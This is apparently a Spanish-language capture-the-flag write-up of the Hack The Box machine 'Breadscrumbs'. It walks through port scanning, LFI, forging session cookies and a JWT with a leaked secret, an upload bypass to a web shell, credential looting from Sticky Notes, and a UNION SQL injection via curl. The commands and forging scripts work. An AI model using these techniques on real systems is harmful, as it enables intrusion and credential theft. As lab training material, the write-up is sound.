---
title: Breadscrumbs
date: 2023-04-28 13:25:30 +/-TTTT
categories: [HTB MACHINES, Windows]
tags: []     # TAG names should always be lowercase
---

```shell
# Nmap 7.93 scan initiated Fri Apr 28 22:52:39 2023 as: nmap -sCV -p22,80,135,139,443,445,3306,5040,7680,49664,49665,49666,49667,49668,49669 -oN targeted 10.10.10.228
Nmap scan report for 10.10.10.228
Host is up (0.12s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 9dd0b8815554ea0f89b11032336aa78f (RSA)
|   256 1f2e67371ab8911d5c3159c7c6df141d (ECDSA)
|_  256 309e5d12e3c6b7c63b7e1ee7897e83e4 (ED25519)
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Library
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   NULL: 
|_    Host '10.10.14.19' is not allowed to connect to this MariaDB server
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.93%I=7%D=4/28%Time=644CA29E%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.19'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-04-29T04:55:55
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: 21s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr 28 22:55:49 2023 -- 1 IP address (1 host up) scanned in 190.26 seconds
```
Encontramos un sitio web sobre libros, al revisarla no parece hacer algo útil, haciendo fuzzing encontramos varias rutas interesantes.

![imagen1](/assets/images/Bread/bread1.png)

```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/Breadscrumbs$ wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/common.txt -u "http://10.10.10.228/FUZZ"         
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.228/FUZZ
Total requests: 4715

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                 
=====================================================================

000000024:   403        9 L      30 W       301 Ch      ".htaccess"                                                                                                             
000000025:   403        9 L      30 W       301 Ch      ".htpasswd"                                                                                                             
000000023:   403        9 L      30 W       301 Ch      ".hta"                                                                                                                  
000000230:   301        9 L      30 W       333 Ch      "DB"                                                                                                                    
000000210:   301        9 L      30 W       336 Ch      "Books"                                                                                                                 
000000297:   301        9 L      30 W       334 Ch      "PHP"                                                                                                                   
000000763:   403        9 L      30 W       301 Ch      "aux"                                                                                                                   
000000904:   301        9 L      30 W       336 Ch      "books"                                                                                                                 
000001039:   403        9 L      30 W       301 Ch      "cgi-bin/"                                                                                                              
000001159:   403        9 L      30 W       301 Ch      "com3"                                                                                                                  
000001160:   403        9 L      30 W       301 Ch      "com4"                                                                                                                  
000001158:   403        9 L      30 W       301 Ch      "com2"                                                                                                                  
000001157:   403        9 L      30 W       301 Ch      "com1"                                                                                                                  
000001204:   403        9 L      30 W       301 Ch      "con"                                                                                                                   
000001375:   301        9 L      30 W       333 Ch      "db"                                                                                                                    
000001327:   301        9 L      30 W       334 Ch      "css"                                                                                                                   
000001707:   503        11 L     44 W       401 Ch      "examples"                                                                                                              
000002195:   200        45 L     118 W      2368 Ch     "index.php"                                                                                                             
000002188:   301        9 L      30 W       339 Ch      "includes"                                                                                                              
000002351:   301        9 L      30 W       333 Ch      "js"                                                                                                                    
000002454:   403        11 L     47 W       420 Ch      "licenses"                                                                                                              
000002537:   403        9 L      30 W       301 Ch      "lpt1"                                                                                                                  
000002538:   403        9 L      30 W       301 Ch      "lpt2"                                                                                                                  
000002862:   403        9 L      30 W       301 Ch      "nul"                                                                                                                   
000003078:   301        9 L      30 W       334 Ch      "php"                                                                                                                   
000003107:   403        9 L      30 W       301 Ch      "phpmyadmin"                                                                                                            
000003192:   301        9 L      30 W       337 Ch      "portal"                                                                                                                
000003271:   403        9 L      30 W       301 Ch      "prn"                                                                                                                   
000003712:   403        11 L     47 W       420 Ch      "server-status"                                                                                                         
000003711:   403        11 L     47 W       420 Ch      "server-info"                                                                                                           
000004468:   403        9 L      30 W       301 Ch      "webalizer"                                                                                                             
```
En este punto encontramos varias rutas donde la más interesante es la de portal, al revisarla nos encontramos con un formulario donde podemos registrarnos y logearnos. Dentro encontramos información sobre usuarios y poco más. Al no obtener nada intersante regresamos a la primera página para revisarla con burpsuite.

![imagen2](/assets/images/Bread/bread2.png)

![imagen3](/assets/images/Bread/bread3.png)

En este punto interceptamos la parte de lectura de libros y poniendo cualquier nombre de libro nos muestra un error donde menciona que el archivo no existe, esto porque está ejecutando file get content por detrás, podemos hacer LFI para verificar que podamos leer archivos del sistema.

![imagen4](/assets/images/Bread/bread4.png)

![imagen5](/assets/images/Bread/bread5.png)

![imagen6](/assets/images/Bread/bread6.png)

En este punto podemos empezar a revisar archivo interesantes que encontramos fuzzeando y no podíamos leer. Uno de estos archivos lo encontramos en /portal/cookies.php, donde podemos ver cómo se crea la cookie de sesión de los usuarios. Copiamos el output y le damos forma para que podamos usarlo.

```php
<?php
function makesession($username){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = "s4lTy_stR1nG_".$username[$seed].'(!528./9890';
    $session_cookie = $username.md5($key);

    echo $session_cookie;
}

makesession("test")
?>
```
Con esto podemos crearnos la cookie de algún usuario admin que nos mostraba en el apartado de usuarios en la página web.

![imagen8](/assets/images/Bread/bread8.png)

Haciendo pruebas vemos que pudimos logearnos correctamente con paul. Con esto pudimos acceder al apartado de file management, pero al intentar subir el archivo zip que solicita nos muestra un error. Podemos intentar revisar el código fuente de file.php para saber que hace.

![imagen9](/assets/images/Bread/bread9.png)

Tratamos la data y parte del código nos muestra que hace una autorización en el archivo login.php, procedemos a obtener la información. Dentro de login.php manda a llamar a authcontroller.php por lo que al revisar la info vemos el secreto para forjar el jwt.

```php
<?php session_start();
$LOGGED_IN = false;
if($_SESSION['username'] !== "paul"){
    header("Location: ../index.php");
}
if(isset($_SESSION['loggedIn'])){
    $LOGGED_IN = true;
    require '../db/db.php';
}
else{
    header("Location: ../auth/login.php");
    die();
}
?>
```
```php
<SNIP>
if($valid){
    session_id(makesession($username));
    session_start();

    $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
    $data = array();

    $payload = array(
        "data" => array(
            "username" => $username
    ));

    $jwt = JWT::encode($payload, $secret_key, 'HS256');
    
    setcookie("token", $jwt, time() + (86400 * 30), "/");

    $_SESSION['username'] = $username;
    $_SESSION['loggedIn'] = true;
    if($userdata[0]['position'] == ""){
        $_SESSION['role'] = "Awaiting approval";
    } 
    else{
        $_SESSION['role'] = $userdata[0]['position'];
<SNIP>
```
Con ayuda de jwt en python podemos forjar nuestro propio jwt y así tenemos los permisos para subir el archivo.

```shell
import jwt

data = { "data" : {'username': "paul"}}
secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e'
algorithm = 'HS256'

token = jwt.encode(data, secret_key, algorithm=algorithm)
print(token)
```

![imagen10](/assets/images/Bread/bread10.png)

En este paso podemos hacer bypass al archivo zip interceptando la petición y luego cambiando la extensión a php, el contenido en un principio nos denegaba el uso de la función system por lo que cambiar por shell_exec y así pudimos obtener una web shell y entablarnos una conexión.

![imagen11](/assets/images/Bread/bread11.png)

```powershell
C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 7C07-CD3A

 Directory of C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData

02/08/2021  06:37 AM    <DIR>          .
02/08/2021  06:37 AM    <DIR>          ..
11/28/2020  02:48 AM               170 alex.disabled
11/28/2020  02:48 AM               170 emma.disabled
11/28/2020  02:48 AM               170 jack.disabled
11/28/2020  02:48 AM               170 john.disabled
01/17/2021  04:11 PM               192 juliette.json
11/28/2020  02:48 AM               170 lucas.disabled
11/28/2020  02:48 AM               170 olivia.disabled
11/28/2020  02:48 AM               170 paul.disabled
11/28/2020  02:48 AM               170 sirine.disabled
11/28/2020  02:48 AM               170 william.disabled
              10 File(s)          1,722 bytes
               2 Dir(s)   6,542,053,376 bytes free

C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData>net user
net user

User accounts for \\BREADCRUMBS

-------------------------------------------------------------------------------
Administrator            DefaultAccount           development              
Guest                    juliette                 sshd                     
WDAGUtilityAccount       www-data                 
The command completed successfully.

C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData>type juliette.json
type juliette.json
{
	"pizza" : "margherita",
	"size" : "large",	
	"drink" : "water",
	"card" : "VISA",
	"PIN" : "9890",
	"alternate" : {
		"username" : "juliette",
		"password" : "jUli901./())!",
	}
}
```
Dentro encontramos las credenciales del usuario juliette. Intentamos revisar los archivos compartidos que tiene este usuario.

```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/Breadscrumbs/rlwrap-0.46.1$ smbclient -U juliette -L 10.10.10.228
Password for [WORKGROUP\juliette]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Anouncements    Disk      
	C$              Disk      Default share
	Development     Disk      
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/Breadscrumbs/rlwrap-0.46.1$ smbclient -U juliette //10.10.10.228/Anouncements 
Password for [WORKGROUP\juliette]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jan 15 18:03:48 2021
  ..                                  D        0  Fri Jan 15 18:03:48 2021
  main.txt                            A      306  Fri Jan 15 18:06:10 2021

		5082961 blocks of size 4096. 1597194 blocks available
smb: \> get main.txt
getting file \main.txt of size 306 as main.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
```
Con estas credenciales pudimos conectarnos por ssh. Dentro del escritorio encontramos algunas tareas que tienen pendientes.

```html
juliette@BREADCRUMBS C:\Users\juliette\Desktop>type todo.html
<html>
<style>
html{
background:black;
color:orange;
}
table,th,td{
border:1px solid orange;
padding:1em;
border-collapse:collapse;
}
</style>
<table>
        <tr>
            <th>Task</th>
            <th>Status</th>
            <th>Reason</th>
        </tr>
        <tr>
            <td>Configure firewall for port 22 and 445</td>
            <td>Not started</td>
            <td>Unauthorized access might be possible</td>
        </tr>
        <tr>
            <td>Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager</td>
            <td>In progress</td>
            <td>It stores passwords in plain text</td>
        </tr>
        <tr>
            <td>Add new features to password manager</td>
            <td>Not started</td>
            <td>To get promoted, hopefully lol</td>
        </tr>
</table>
```
Menciona algo sobre unas stickykeys por lo que procedemos a revisarlas. Podemos traernos el archivo plum.sqlite para revisar su contenido.

```powershell
PS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState> dir


    Directory: C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/15/2021   4:10 PM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----        11/29/2020   3:10 AM           4096 plum.sqlite
-a----         1/15/2021   4:10 PM          32768 plum.sqlite-shm
-a----         1/15/2021   4:10 PM         329632 plum.sqlite-wal
```
Nos compartimos una carpeta por smb y así nos pasamos todos los archivos, por alguna razón la única manera de que el archivo no quede vacio es descargando todos los plum con wildcard, después abrimos el archivo con sqlite3.

```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/Breadscrumbs/content$ sqlite3 plum.sqlite                            
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .tables
Media           Stroke          SyncState       User          
Note            StrokeMetadata  UpgradedNote  
sqlite> .schema Note
CREATE TABLE IF NOT EXISTS "Note" (
"Text" varchar ,
"WindowPosition" varchar ,
"IsOpen" integer ,
"IsAlwaysOnTop" integer ,
"CreationNoteIdAnchor" varchar ,
"Theme" varchar ,
"IsFutureNote" integer ,
"RemoteId" varchar ,
"ChangeKey" varchar ,
"LastServerVersion" varchar ,
"RemoteSchemaVersion" integer ,
"IsRemoteDataInvalid" integer ,
"Type" varchar ,
"Id" varchar primary key not null ,
"ParentId" varchar ,
"CreatedAt" bigint ,
"DeletedAt" bigint ,
"UpdatedAt" bigint );
sqlite> Select Text from Note;
\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!
\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: [MOVED]
```
Encontramos la contraseña del usuario development, con esto podemos entrar por ssh y seguir enumerando para conseguir el root. Con este nuevo usuario vemos que podemos ingresar a la carpeta compartida development.

```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/Breadscrumbs/content$ crackmapexec smb 10.10.10.228 -u development -p 'fN3)sN5Ee@g' --shares
/usr/lib/python3/dist-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
SMB         10.10.10.228    445    BREADCRUMBS      [*] Windows 10.0 Build 19041 x64 (name:BREADCRUMBS) (domain:Breadcrumbs) (signing:False) (SMBv1:False)
SMB         10.10.10.228    445    BREADCRUMBS      [+] Breadcrumbs\development:fN3)sN5Ee@g 
SMB         10.10.10.228    445    BREADCRUMBS      [+] Enumerated shares
SMB         10.10.10.228    445    BREADCRUMBS      Share           Permissions     Remark
SMB         10.10.10.228    445    BREADCRUMBS      -----           -----------     ------
SMB         10.10.10.228    445    BREADCRUMBS      ADMIN$                          Remote Admin
SMB         10.10.10.228    445    BREADCRUMBS      Anouncements    READ            
SMB         10.10.10.228    445    BREADCRUMBS      C$                              Default share
SMB         10.10.10.228    445    BREADCRUMBS      Development     READ            
SMB         10.10.10.228    445    BREADCRUMBS      IPC$            READ            Remote IPC
```
```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/Breadscrumbs/content$ smbclient -U development //10.10.10.228/Development
Password for [WORKGROUP\development]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jan 15 18:03:49 2021
  ..                                  D        0  Fri Jan 15 18:03:49 2021
  Krypter_Linux                       A    18312  Sun Nov 29 05:11:56 2020

		5082961 blocks of size 4096. 1594168 blocks available
smb: \> get krypter_Linux
getting file \krypter_Linux of size 18312 as krypter_Linux (27.8 KiloBytes/sec) (average 27.8 KiloBytes/sec)
```
Encontramos un archivo ELF, al ejecutarlo nos pide una contraseña, al no tener ninguna podemos revisar a profundad que es lo que hace con ghidra.

```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/Breadscrumbs/content$ ./krypter_Linux 
Krypter V1.2

New project by Juliette.
New features added weekly!
What to expect next update:
	- Windows version with GUI support
	- Get password from cloud and AUTOMATICALLY decrypt!
***

No key supplied.
USAGE:

Krypter <key>
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/Breadscrumbs/content$ ./krypter_Linux aaaa
Krypter V1.2

New project by Juliette.
New features added weekly!
What to expect next update:
	- Windows version with GUI support
	- Get password from cloud and AUTOMATICALLY decrypt!
***

Incorrect master key
```
Vemos que cuando se acepta la contraseña este hace un llamado con curl hacia un ruta solicitando una contraseña, podemos intentar hacerlo para obtenerla. Hacermos portforwarding y metemos el domini passmaganer.htb a nuestro /etc/hosts.

```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/Breadscrumbs/content$ curl 'http://127.0.0.1:1234/index.php?method=select&username=administrator&table=passwords'
selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
}
```
Parece que está haciendo uso de alguna base de datos para obtener la contraseña, podemos intentar hacer una inyección sql para obtener los demás datos.

```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/Breadscrumbs/content$ curl -s "http://127.0.0.1:1234/index.php" -d "method=select&username=administrator' union select group_concat(id, account, password, aes_key) from passwords-- -&table=passwords" 
selectarray(2) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
  [1]=>
  array(1) {
    ["aes_key"]=>
    string(74) "1AdministratorH2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=k19D193j.<19391("
  }
}
```
Obtenemos la contraseña, podemos descifrarla por medio de cyberchef.

![imagen12](/assets/images/Bread/bread12.png)

Con esto pudimos obtener la contraseña del usuario administrador y podemos logearnos.

```shell
gu3ro@parrot:/home/gu3ro/Desktop/guero/htb/Breadscrumbs/content$ crackmapexec smb 10.10.10.228 -u administrator -p 'p@ssw0rd!@#$9890./'  
SMB         10.10.10.228    445    BREADCRUMBS      [*] Windows 10.0 Build 19041 x64 (name:BREADCRUMBS) (domain:Breadcrumbs) (signing:False) (SMBv1:False)
SMB         10.10.10.228    445    BREADCRUMBS      [+] Breadcrumbs\administrator:p@ssw0rd!@#$9890./ (Pwn3d!)
```
